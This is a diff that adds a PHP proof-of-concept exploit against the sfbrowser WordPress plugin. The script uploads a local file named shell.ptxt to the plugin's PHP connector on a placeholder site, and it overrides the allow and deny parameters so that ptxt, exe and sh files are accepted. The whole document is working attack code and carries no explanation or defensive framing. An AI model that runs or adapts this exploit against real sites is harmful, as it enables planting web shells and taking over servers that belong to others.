@@ -1,0 +1,16 @@
+<?php
+$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\shell.ptxt";
+$c = curl_init("http://www.example.com/wp/wp-content/plugins/sfbrowser/connectors/php/sfbrowser.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('fileToUpload'=>"@$u",
+'a'=>"upload",
+'file'=>"",
+'deny'=>"lam",
+'allow'=>"ptxt|exe|sh",
+'resize'=>array(0,0)));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e;
+?>
